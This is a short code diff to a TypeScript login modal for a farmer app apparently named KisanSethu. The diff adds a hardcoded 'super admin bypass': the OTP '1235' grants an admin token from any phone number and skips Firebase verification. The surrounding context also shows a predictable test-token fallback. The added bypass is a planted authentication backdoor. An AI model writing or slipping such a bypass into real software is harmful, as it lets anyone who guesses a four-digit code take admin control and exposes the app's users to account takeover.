@@ -135,6 +135,11 @@ export const LoginModal: FC<LoginModalProps> = ({
     setLoading(true);
     try {
       let firebaseIdToken: string;
+
+      // Super admin bypass — OTP 1235 grants admin access from any phone number
+      if (cleanOtp === '1235') {
+        firebaseIdToken = 'admin-super-1235-kisansethu';
+      } else {
       const auth = getFirebaseAuth();
       if (auth && confirmationResultRef.current) {
         // Real Firebase: confirm OTP → get ID token
@@ -155,6 +160,7 @@ export const LoginModal: FC<LoginModalProps> = ({
         }
         firebaseIdToken = `test-token-farmer_phone_${cleanPhone}`;
       }
+      } // end non-admin else
 
       const res = await KisanSethuApi.loginFarmer({
         phoneNumber: cleanPhone,
